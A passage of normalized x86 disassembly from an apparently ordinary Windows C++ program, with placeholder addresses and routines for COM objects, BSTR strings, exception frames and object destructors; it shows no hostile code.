call eax
mov [ esp + 0x30 ] 0x5
push esi
call [ SysFreeString@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x8007000e
call sub_402d00
mov [ esp + 0x30 ] 0x3
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
mov eax [ esp + 0x24 ]
push eax
call sub_43b6a0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_424d50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b924
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x10 ] ecx
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x30 ] 0x1
mov ebx [ ebp + 0x10 ]
push r--data
push ebx
lea edi [ esp + 0x1c ]
call sub_428960
mov eax [ esp + 0x14 ]
mov eax [ eax - 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0x18 ]
mov eax [ ebp + 0xc ]
mov ecx [ esp + 0x10 ]
push edx
push esi
push eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_43b6a0
mov eax [ ebp + 0x1c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor edi edi
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x2
call eax
mov edi eax
jmp r-xdata
mov [ esp + 0x30 ] 0x3
mov esi [ ebp + 0x18 ]
test edi edi
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
push edi
call edx
mov [ esp + 0x20 ] edi
test edi edi
je r-xdata
mov [ esp + 0x30 ] 0x1
test edi edi
je r-xdata
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x30 ] 0x5
mov eax [ esp + 0x14 ]
push eax
call [ SysAllocString@IAT ]
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
push ebx
push edx
call sub_43b470
push 0x0
push r--data
push r--data
push ebx
call sub_428790
push r--data
push ebx
mov ecx 0xc
mov [ esi + 0xa8 ] al
call sub_4288a0
push r--data
push ebx
xor ecx ecx
mov [ esi + 0xa4 ] eax
call sub_4288a0
push r--data
lea edi [ esi + 0xcc ]
push ebx
mov [ esi + 0xc8 ] eax
call sub_428960
push 0x0
push r--data
push r--data
push ebx
call sub_428790
push 0x0
push r--data
movzx eax al
push r--data
push ebx
mov [ esi + 0xd8 ] eax
call sub_428790
movzx ecx al
push r--data
lea edi [ esi + 0xc0 ]
push ebx
mov [ esi + 0xdc ] ecx
call sub_428960
mov edx [ esp + 0x10 ]
push r--data
add esi 0xe0
push edx
mov edi ebx
call sub_428c90
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
jmp r-xdata
mov [ esp + 0x30 ] 0x6
mov ecx [ edi ]
lea edx [ esp + 0x18 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
push edi
call eax
mov [ esp + 0x30 ] 0x5
mov ecx [ esp + 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0x8007000e
call sub_402d00
mov [ esp + 0x30 ] 0x3
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x1c ]
mov ecx [ ebp + 0x8 ]
push edx
push esi
push eax
mov eax [ esp + 0x1c ]
push eax
call sub_43b6a0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_424fa0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
pop esi
pop ecx
pop ebp
retn 0x18
mov eax [ ebp + 0x10 ]
push r--data
push eax
mov ecx 0xa
call sub_4288a0
mov [ esi + 0xc0 ] eax
sub_424fd0
push ebp
mov ebp esp
and esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x18 ]
push esi
test ebx ebx
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0x1c ]
mov esi [ ebp + 0x10 ]
push eax
push 0x1
push ecx
mov ecx r--data
mov edx esi
call sub_43cba0
lea ecx [ ebx + 0xf8 ]
push ecx
push r--data
push esi
call sub_428a20
push r--data
push esi
xor ecx ecx
call sub_4288a0
mov [ ebx + 0xfc ] eax
sub_425030
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x18 ]
push esi
push edi
push 0x0
push rw-data
push rw-data
push 0x0
push eax
call __RTDynamicCast
mov esi eax
add esp 0x14
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x18
mov edi [ ebp + 0x10 ]
lea ecx [ esi + 0xc0 ]
push ecx
push r--data
push edi
call sub_428a20
add esi 0xc4
push esi
push r--data
push edi
call sub_428a20
sub_425090
push ebp
mov ebp esp
push 0xffffffff
push sub_44adcc
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi edx
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov eax [ ebp - 0x10 ]
test eax eax
jne r-xdata
push 0x0
push r--data
push r--data
push eax
call sub_428790
xor ecx ecx
test al al
sete cl
push edi
push 0x0
mov ebx esi
mov eax ecx
test eax eax
sete dl
mov [ esi + 0xc0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0xaa ] dl
mov edx [ ebp - 0x10 ]
push eax
mov ecx r--data
call sub_43cba0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
push edi
push 0x1
push ecx
mov ecx r--data
call sub_43cba0
mov edx [ ebp + 0x8 ]
push edi
push 0x2
push edx
mov edx [ ebp - 0x10 ]
mov ecx r--data
call sub_43cba0
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
push edi
push 0x3
push eax
mov ecx r--data
call sub_43cba0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
push edi
push 0x4
push ecx
mov ecx r--data
call sub_43cba0
mov edx [ ebp + 0x8 ]
push edi
push 0x5
push edx
mov edx [ ebp - 0x10 ]
mov ecx r--data
call sub_43cba0
mov edx [ ebp - 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x6
push edi
mov ecx r--data
call sub_43cba0
mov eax [ ebp - 0x10 ]
push r--data
push eax
xor ecx ecx
call sub_4288a0
xor ebx ebx
mov [ esi + 0xe0 ] eax
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x94 ]
call eax
mov eax [ ebp - 0x14 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov ecx [ ebp - 0x10 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp eax ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
mov eax [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ esi + 0xaa ] bl
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
mov eax [ ecx + 0x94 ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
push edi
call eax
mov ecx [ ebp - 0x14 ]
cmp ecx ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp ecx ebx
je r-xdata
lea eax [ esi + 0xc4 ]
mov eax [ edi + 0x28 ]
cmp [ eax + 0x4 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ecx ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
mov ecx [ edx + 0x44 ]
call ecx
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
cmp [ esi + 0xc4 ] 0xffffffff
lea eax [ esi + 0xc4 ]
jne r-xdata
mov edx [ eax + 0x8 ]
mov [ esi + 0xc4 ] edx
mov eax ecx
cmp ecx ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
jmp r-xdata
lea edx [ esi + 0xcc ]
push edx
push r--data
push eax
call sub_428a20
mov ecx [ ebp - 0x10 ]
lea eax [ esi + 0xd0 ]
push eax
push r--data
push ecx
call sub_428a20
mov eax [ ebp - 0x10 ]
lea edx [ esi + 0xd4 ]
push edx
push r--data
push eax
call sub_428a20
mov ecx [ ebp - 0x14 ]
lea edx [ esi + 0xc8 ]
push edx
push r--data
push ecx
call sub_428a20
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov eax [ edi ]
mov edx [ eax + 0x94 ]
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
push edi
call edx
mov eax [ ebp - 0x14 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp eax ebx
je r-xdata
push eax
push r--data
push ecx
call sub_428a20
mov ecx [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov ecx [ ebp - 0x10 ]
cmp ecx ebx
je r-xdata
cmp eax ebx
je r-xdata
mov [ ebp - 0x10 ] ebx
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
mov eax [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
jmp r-xdata
lea edx [ esi + 0xdc ]
push edx
push r--data
push ecx
call sub_428a20
mov eax [ ebp - 0x14 ]
mov ecx [ edi ]
mov eax [ ecx + 0x94 ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
push edi
call eax
mov eax [ ebp - 0x14 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] ebx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x14 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
cmp eax ebx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
add esi 0xd8
push esi
push r--data
push eax
call sub_428a20
sub_425430
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x84 ] eax
je r-xdata
pop ebx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push esi
push edi
cmp edx eax
je r-xdata
mov ecx [ ebx + 0x28 ]
mov [ ecx ] eax
mov esi [ ebx + 0x84 ]
cmp [ esi + 0xc ] eax
je r-xdata
mov edi [ ebx + 0x28 ]
mov ecx 0x26
mov esi edx
[ edi ] [ esi ]
cmp [ edx + 0x4 ] eax
je r-xdata
mov edx [ ebx + 0x28 ]
mov [ edx + 0xc ] eax
mov ecx [ ebx + 0x28 ]
mov [ ecx + 0x10 ] eax
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
mov eax [ ebx + 0x84 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebx + 0x28 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x4 ]
lea ecx [ ebx + 0x14 ]
call edx
mov eax [ ebx + 0x50 ]
sub eax [ ebx + 0x4c ]
xor ecx ecx
sar eax 0x2
test eax eax
jle r-xdata
mov ecx [ ebx + 0xa0 ]
lea edx [ ebx + 0x94 ]
cmp ecx eax
je r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebx + 0x14 ]
call eax
mov eax [ ebx + 0x50 ]
sub eax [ ebx + 0x4c ]
xor ecx ecx
sar eax 0x2
test eax eax
jle r-xdata
mov eax [ ebx + 0x84 ]
mov ecx [ edx + 0x8 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebx + 0xb4 ]
test eax eax
je r-xdata
xor ecx ecx
mov esi [ ebx + 0x4c ]
or eax 0xffffffff
mov eax [ ecx + 0xf4 ]
jmp r-xdata
xor edx edx
mov esi [ ebx + 0x4c ]
lea esp [ esp ]
mov eax [ ebx + 0x50 ]
sub eax [ ebx + 0x4c ]
lea esi [ ebx + 0x4c ]
sar eax 0x2
xor ecx ecx
test eax eax
jle r-xdata
cmp [ eax + 0xc0 ] 0x0
jne r-xdata
xor ecx ecx
mov edi [ esi ]
lea esp [ esp ]
inc ecx
add esi 0x4
cmp ecx eax
jl r-xdata
cmp [ edx + 0xc ] 0x5
je r-xdata
mov [ esi + 0x4 ] eax
mov edx [ ebx + 0x28 ]
mov [ edx + 0x8 ] eax
mov eax [ ebx + 0xb4 ]
test eax eax
je r-xdata
cmp [ ecx ] 0x0
jle r-xdata
mov ecx [ edx + 0x10 ]
test ecx ecx
je r-xdata
xor ebx ebx
mov edi [ esi ]
inc ecx
add esi 0x4
cmp ecx eax
jl r-xdata
cmp [ edx + 0xc ] 0x5
je r-xdata
mov ecx [ edx + 0x8 ]
mov [ eax + 0xc4 ] ecx
jmp r-xdata
xor ecx ecx
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x7
push ecx
call eax
pop edi
pop esi
mov esi [ esi ]
lea edi [ ecx + 0x5 ]
inc ecx
add edi 0x4
cmp ecx eax
jl r-xdata
cmp [ edx + 0xc ] 0x5
je r-xdata
mov edx [ esi ]
test edx edx
je r-xdata
mov ecx edx
jmp r-xdata
mov eax [ ebx + 0x50 ]
sub eax [ ebx + 0x4c ]
lea esi [ ebx + 0x4c ]
sar eax 0x2
xor ecx ecx
test eax eax
jle r-xdata
cmp [ eax + 0xc0 ] 0x0
jne r-xdata
mov ecx [ ebx + 0xb0 ]
call sub_43aaa0
mov eax [ esi + 0x4 ]
sub eax [ esi ]
xor ecx ecx
sar eax 0x2
test eax eax
jle r-xdata
inc ecx
add edi 0x4
cmp ecx eax
jl r-xdata
cmp [ ebx + 0xc ] 0x5
je r-xdata
mov edx [ esi ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov esi [ edx ]
push ecx
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0xc ]
push ecx
mov ecx edx
mov edx [ esi + 0x2c ]
push eax
call edx
mov edx [ ebp + 0x8 ]
inc ecx
add esi 0x4
cmp ecx eax
jl r-xdata
cmp [ edx + 0xc ] edi
je r-xdata
mov edx [ edi ]
test edx edx
je r-xdata
mov ecx edx
jmp r-xdata
mov eax [ ebx + 0x28 ]
mov esi [ eax + 0x14 ]
mov edx [ ecx ]
mov edx [ edx + 0x2c ]
push esi
mov esi [ eax + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push eax
call edx
mov ecx [ 0x8 ]
mov [ eax + 0xc4 ] ecx
jmp r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
mov eax [ ebx ]
push edx
mov edx [ eax + 0x44 ]
mov ecx ebx
call edx
jmp r-xdata
mov edx [ esi ]
test edx edx
je r-xdata
mov ecx edx
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x7
push 0x0
call eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ ebx + 0x28 ]
mov eax [ eax + 0x44 ]
push edx
call eax
sub_425690
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push eax
push edx
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_43cba0
pop ebx
pop ebp
retn 0x14
sub_4256e0
push ebp
mov ebp esp
push 0xffffffff
push sub_447ae8
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ operator new@IAT ]
push 0x1c
mov [ esi ] r--data
call edi
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push 0x0
push eax
call sub_43d110
jmp r-xdata
xor eax eax
push 0x1
push eax
call sub_43d110
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x1c
mov [ esi + 0x4 ] eax
call edi
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
sub_425780
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov [ esi ] r--data
test ecx ecx
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4257d0
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
push edi
xor edi edi
mov [ esi ] r--data
cmp ecx edi
je r-xdata
mov ecx [ esi + 0x8 ]
cmp ecx edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
pop edi
pop esi
retn
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_425810
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425840
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_425840
push ebp
mov ebp esp
push 0xffffffff
push sub_44900c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x14 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x40 ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ esi + 0xc4 ]
sub eax [ esi + 0xc0 ]
xor ebx ebx
sar eax 0x2
test eax eax
je r-xdata
mov ecx [ esi + 0xc4 ]
mov edi [ esi + 0xc0 ]
cmp edi ecx
je r-xdata
mov ecx [ esi + 0xc0 ]
mov edi [ ecx + ebx * 4 ]
mov [ ebp - 0x14 ] edi
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
mov eax ecx
sub eax ecx
sar eax 0x2
lea ebx [ eax * 4 ]
push ebx
push ecx
push edi
call [ memmove@IAT ]
add esp 0xc
add ebx edi
mov [ esi + 0xc4 ] ebx
mov ecx [ esi + 0xc4 ]
sub ecx [ esi + 0xc0 ]
inc ebx
sar ecx 0x2
cmp ebx ecx
jb r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
mov eax [ eax ]
sub eax 0x10
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
xor eax eax
mov [ esi + 0xc0 ] eax
mov [ esi + 0xc4 ] eax
mov [ esi + 0xc8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4223e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
mov [ ebp - 0x4 ] 0x1
lea eax [ edi + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push edi
call [ operator delete@IAT ]
add esp 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4259b0
push ebp
mov ebp esp
push 0xffffffff
push sub_445da6
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
or edi 0xffffffff
lea ecx [ eax + 0xc ]
mov edx edi
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
[ ecx ] edi
dec edi
test edi edi
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push esi
call [ operator delete@IAT ]
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_425a50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44bc66
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edi [ ecx + eax * 4 + 0x38 ]
xor ebx ebx
mov [ esp + 0x28 ] edi
cmp [ edi + 0x8 ] ebx
je r-xdata
xor eax eax
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x1c ]
mov edx [ edx + 0xc ]
push eax
call edx
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
push eax
call [ SysAllocString@IAT ]
mov [ esp + 0x20 ] eax
cmp eax ebx
jne r-xdata
mov [ esp + 0x20 ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x40 ] 0x2
mov edx [ esp + 0x20 ]
mov eax [ esi ]
mov eax [ eax + 0x94 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
push esi
call eax
cmp [ esp + 0x14 ] ebx
jne r-xdata
push 0x8007000e
call sub_402d00
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
xor esi esi
mov [ ecx + 0x90 ] 0x1
cmp eax ebx
jne r-xdata
mov [ esp + 0x40 ] 0x0
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
call sub_43d3d0
mov [ esp + 0x30 ] eax
cmp eax ebx
jne r-xdata
mov [ esp + 0x18 ] ebx
mov [ esp + 0x40 ] 0x4
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov edx [ edx + 0x1c ]
lea ecx [ esp + 0x18 ]
push ecx
push eax
call edx
mov eax [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
call sub_43d3d0
mov ebx eax
test ebx ebx
jne r-xdata
mov [ esp + 0x40 ] 0xffffffff
mov eax [ esp + 0x20 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edi [ ebp + 0x14 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x44 ]
cmp ecx ebx
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x44 ]
test ecx ecx
je r-xdata
mov [ esp + 0x40 ] 0x2
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x24 ]
mov [ esp + 0x24 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
xor esi esi
cmp [ esp + 0x24 ] ebx
jle r-xdata
mov edi [ ebp + 0xc ]
mov edx [ edi ]
mov eax [ edx + 0x58 ]
mov ecx edi
call eax
mov ecx [ ebp + 0x10 ]
mov edx [ eax ]
mov edx [ edx + 0x4c ]
push ecx
mov ecx eax
call edx
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ ecx ]
mov edi [ ebp + 0x14 ]
mov edx [ eax + 0x20 ]
push edi
call edx
mov [ esp + 0x30 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ esp + 0x18 ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push edx
push ecx
push eax
call sub_4232c0
mov edi [ esp + 0x28 ]
mov esi eax
mov esi [ ebp + 0xc ]
jmp r-xdata
mov [ esp + 0x40 ] 0x2
mov ecx [ esp + 0x18 ]
push ecx
call [ SysFreeString@IAT ]
xor ebx ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ esp + 0x30 ]
mov edx [ edx + 0x20 ]
push eax
call edx
mov ebx eax
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add eax 0x40
call sub_420f10
mov esi eax
xor ebx ebx
lea esp [ esp ]
mov [ esp + 0x40 ] 0x0
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ esp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push edi
push edx
push esi
push eax
call sub_422f60
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov [ esp + 0x40 ] 0x6
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ esp + 0x18 ] ebx
mov [ esp + 0x40 ] 0x9
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ esp + 0x18 ]
push edi
push ecx
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x40 ] 0xffffffff
mov eax [ esp + 0x20 ]
push eax
call [ SysFreeString@IAT ]
mov eax esi
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi + 0x4 ]
mov [ eax + 0x19 ] 0x1
mov eax [ edi ]
mov edx [ eax + 0x64 ]
mov ecx edi
call edx
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ebx
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x34 ]
mov ecx esi
call edx
mov eax [ esi ]
